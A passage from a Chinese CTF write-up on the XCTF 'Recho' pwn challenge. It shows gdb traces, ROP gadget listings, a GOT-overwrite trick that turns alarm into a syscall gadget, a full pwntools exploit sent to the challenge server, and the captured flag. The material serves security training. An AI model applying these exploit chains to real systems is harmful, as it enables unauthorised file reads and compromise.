operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a32</span><span class="token punctuation">]</span>        # <span class="token number">0x601028</span> <span class="token operator">|</span> <span class="token number">0x4005f6</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x2</span> <span class="token operator">|</span> <span class="token number">0x4005fb</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jmp    <span class="token number">0x4005c0</span> <span class="token operator">|</span> <span class="token number">0x400600</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a2a</span><span class="token punctuation">]</span>        # <span class="token number">0x601030</span> <span class="token operator">|</span> <span class="token number">0x400606</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x3</span> <span class="token operator">|</span><span class="token operator">-</span><span class="token operator">></span>   <span class="token number">0x4005f6</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x2</span>       <span class="token number">0x4005fb</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jmp    <span class="token number">0x4005c0</span>       <span class="token number">0x400600</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a2a</span><span class="token punctuation">]</span>        # <span class="token number">0x601030</span>       <span class="token number">0x400606</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x3</span>                                                                  JUMP is taken<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7fffffffddf8</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x40078e</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>Init<span class="token operator">+</span><span class="token number">104</span><span class="token operator">></span><span class="token operator">:</span>    nop<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7fffffffde00</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x7fffffffde50</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400840</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span><span class="token operator">:</span>    push   r15<span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7fffffffde08</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4007a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">18</span><span class="token operator">></span><span class="token operator">:</span>    mov    edx<span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7fffffffde10</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> <span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7fffffffde18</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x40088d</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">77</span><span class="token operator">></span><span class="token operator">:</span>    add    rbx<span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7fffffffde20</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7ffff7de59a0</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>_dl_fini<span class="token operator">></span><span class="token operator">:</span>    push   rbp<span class="token punctuation">)</span><span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7fffffffde28</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7fffffffde30</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400840</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span><span class="token operator">:</span>    push   r15<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x00000000004005f0</span> in alarm<span class="token annotation punctuation">@plt</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token operator">-</span>peda$ 发现其got表地址为<span class="token number">0x601028</span>，此时其got表中还没有alarm真正的地址</code></pre><p>所以我们继续执行</p><pre class=" language-java"><code class="language-java"><span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x7ffff7ac8840</span> <span class="token operator">&lt;</span>alarm<span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x25</span>   <span class="token number">0x7ffff7ac8845</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    syscall    <span class="token number">0x7ffff7ac8847</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span><span class="token operator">:</span>    cmp    rax<span class="token punctuation">,</span><span class="token number">0xfffffffffffff001</span>   <span class="token number">0x7ffff7ac884d</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span><span class="token operator">:</span>    jae    <span class="token number">0x7ffff7ac8850</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span>   <span class="token number">0x7ffff7ac884f</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span><span class="token operator">:</span>    ret<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7fffffffddf8</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x40078e</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>Init<span class="token operator">+</span><span class="token number">104</span><span class="token operator">></span><span class="token operator">:</span>    nop<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7fffffffde00</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x7fffffffde50</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400840</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span><span class="token operator">:</span>    push   r15<span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7fffffffde08</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4007a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">18</span><span class="token operator">></span><span class="token operator">:</span>    mov    edx<span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7fffffffde10</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> <span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7fffffffde18</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x40088d</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">77</span><span class="token operator">></span><span class="token operator">:</span>    add    rbx<span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7fffffffde20</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7ffff7de59a0</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>_dl_fini<span class="token operator">></span><span class="token operator">:</span>    push   rbp<span class="token punctuation">)</span><span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7fffffffde28</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7fffffffde30</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400840</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span><span class="token operator">:</span>    push   r15<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token function">alarm</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> at <span class="token punctuation">.</span><span class="token punctuation">.</span>/sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>syscall<span class="token operator">-</span>template<span class="token punctuation">.</span>S<span class="token operator">:</span><span class="token number">78</span><span class="token number">78</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span>/sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>syscall<span class="token operator">-</span>template<span class="token punctuation">.</span>S<span class="token operator">:</span> 没有那个文件或目录<span class="token punctuation">.</span>gdb<span class="token operator">-</span>peda$ </code></pre><p>我们执行王dl_resolve和dl_fixup后就来到了alarm函数真正的地址。可以看到在alarm偏移量为5的地方就是syscall。<br>我们可以利用gadgets来修改alarm的got表。这里理应放入0x7ffff7ac8840 我们可以让它+5，然后调用alarm函数i就是直接调用syscall，而且此函数副作用很小调用完后还能返回。所以就能被我们改造成一个syscall_ret的gadget</p><h3 id="ROP艺术–修改alarm-got"><a href="#ROP艺术–修改alarm-got" class="headerlink" title="ROP艺术–修改alarm@got"></a>ROP艺术–修改alarm@got</h3><p>因为要使got里面的真实地址+5所以看看有没有add_Retgadgets</p><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ ROPgadget <span class="token operator">--</span>binary Recho <span class="token operator">--</span>only <span class="token string">"add|ret"</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x00000000004008af</span> <span class="token operator">:</span> add bl<span class="token punctuation">,</span> dh <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008ad</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> add bl<span class="token punctuation">,</span> dh <span class="token punctuation">;</span> ret    <span class="token number">0x00000000004008ab</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> add bl<span class="token punctuation">,</span> dh <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008ac</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> ret<span class="token number">0x0000000000400830</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> add cl<span class="token punctuation">,</span> cl <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008ae</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> ret<span class="token number">0x00000000004006f8</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rcx<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> ret   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token number">0x000000000040070d</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rdi<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> ret    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x0000000000400832</span> <span class="token operator">:</span> add cl<span class="token punctuation">,</span> cl <span class="token punctuation">;</span> ret<span class="token number">0x00000000004006f4</span> <span class="token operator">:</span> add eax<span class="token punctuation">,</span> <span class="token number">0x20098e</span> <span class="token punctuation">;</span> add ebx<span class="token punctuation">,</span> esi <span class="token punctuation">;</span> ret<span class="token number">0x000000000040070a</span> <span class="token operator">:</span> add eax<span class="token punctuation">,</span> <span class="token number">0x70093eb</span> <span class="token punctuation">;</span> ret<span class="token number">0x00000000004006f9</span> <span class="token operator">:</span> add ebx<span class="token punctuation">,</span> esi <span class="token punctuation">;</span> ret<span class="token number">0x00000000004005b3</span> <span class="token operator">:</span> add esp<span class="token punctuation">,</span> <span class="token number">8</span> <span class="token punctuation">;</span> ret<span class="token number">0x00000000004005b2</span> <span class="token operator">:</span> add rsp<span class="token punctuation">,</span> <span class="token number">8</span> <span class="token punctuation">;</span> ret<span class="token number">0x00000000004005b6</span> <span class="token operator">:</span> ret</code></pre><p>因为al可以用pop_rax_ret来控制，所以这里很多gadgets都是可以利用的，这里我选用add byte ptr [rdi], al ; ret</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>alarm_got<span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>add_rdi_al_ret<span class="token punctuation">)</span>  <span class="token operator">//</span>这里<span class="token punctuation">[</span><span class="token punctuation">]</span>是取rdi里面的东西作为地址，就是刚好对应取got地址里面的值（真实地址）与al进行add操作这样我们就得到了syscall_ret这样一个伪gadget即alarm_plt<span class="token punctuation">(</span>为啥不是alarm_got<span class="token punctuation">)</span></code></pre><h2 id="ROP艺术–函数无中生有"><a href="#ROP艺术–函数无中生有" class="headerlink" title="ROP艺术–函数无中生有"></a>ROP艺术–函数无中生有</h2><p>open无中生有~~</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#构造fp = open('flag',READONLY)  //open的返回值一般用fp取代</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pp_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token operator">//</span><span class="token number">0</span>代表只读payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>   <span class="token operator">//</span>open系统调用号为<span class="token number">2</span><span class="token comment" spellcheck="true">#syscall_ret</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>alarm_plt<span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#构造read(fp,bss_stage,100))  //用bss段来保存获取的信息流，然后用打印函数打印即可</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token operator">//</span><span class="token number">0</span>，<span class="token number">1</span>表示分别表示标准输入，标准输出，一般其他文件流从<span class="token number">3</span>开始或<span class="token number">4</span>或<span class="token number">5</span>，具体我们可以通过gdb调试修改payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pp_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_stage<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#构造printf(bss_stage)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_stage<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span></code></pre><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = process('./Recho')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">47787</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Recho'</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004008a3</span>pp_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x00000000004008a1</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x00000000004006fe</span>pop_rax_ret <span class="token operator">=</span> <span class="token number">0x00000000004006fc</span>add_rdi_ret <span class="token operator">=</span> <span class="token number">0x000000000040070d</span>bss_stage <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x200</span>alarm_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span>alarm_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>printf_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'400'</span><span class="token punctuation">)</span> <span class="token operator">//</span>保证能够把payload完整输入payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x38</span>  <span class="token operator">//</span>从IDA很容易看出溢出点<span class="token comment" spellcheck="true">#change the GOT of alarm into syscall_addr</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>alarm_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x5</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>add_rdi_ret<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#fd = open('flag',readonly)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pp_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>alarm_plt<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#syscall_ret</span><span class="token comment" spellcheck="true">#read(fd,bss_stage,100)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pp_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_stage<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#using printf to print bss_stage</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_stage<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">//</span><span class="token comment" spellcheck="true">#这步也关键，尽量使字符串长，这样才能将我们的 payload 全部输进去，不然可能因为会有缓 存的问题导致覆盖不完整</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">//</span>送出payload后关闭输入流即可退出<span class="token keyword">while</span>循环ret到我们的rop链上sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x2a</span> bytes<span class="token operator">:</span>    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token operator">*</span>    <span class="token number">00000020</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">90</span> <span class="token number">01</span>                     │AAAA│AAAA│··│    0000002aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x2d</span> bytes<span class="token operator">:</span>    <span class="token string">'cyberpeace{98de696c1dba243594ce86109c32492f}\n'</span>cyberpeace<span class="token punctuation">{</span>98de696c1dba243594ce86109c32492f<span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Closed connection to <span class="token number">220.249</span><span class="token punctuation">.</span><span class="token number">52.133</span> port <span class="token number">47787</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Got 